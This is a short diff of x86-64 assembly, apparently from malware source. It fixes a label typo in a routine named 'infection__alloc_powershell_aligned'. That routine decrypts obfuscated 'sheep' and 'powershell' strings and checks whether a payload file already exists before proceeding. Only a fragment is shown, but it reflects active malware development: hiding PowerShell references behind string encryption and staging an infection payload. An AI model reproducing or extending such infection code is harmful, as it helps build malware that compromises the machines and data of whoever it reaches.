@@ -104,7 +104,7 @@ infection__alloc_powershell_aligned:
    movups [rsp+0xc4],xmm0
    mov [rsp+0xd4],ecx
 
-   lea rcx, [rbx+(infection__data__sheep-infection__data_start)] ; load sheep string struct
+   lea rcx, [rbx+(infection__data__sheep-infection__data__start)] ; load sheep string struct
    mov rdx, [rbp-0x10]          ; decrypted sheep string pointer
    call decrypt_string
 
@@ -113,7 +113,7 @@ infection__alloc_powershell_aligned:
    cmp eax, 0xFFFFFFFF          ; eax == INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists ; jump taken means the file exists
 
-   lea rcx, [rbx+(infection__data__powershell-infection__data_start)] ; load powershell string struct
+   lea rcx, [rbx+(infection__data__powershell-infection__data__start)] ; load powershell string struct
    mov rdx, [rbp-0x20]          ; decrypted powershell string pointer
    call decrypt_string
 
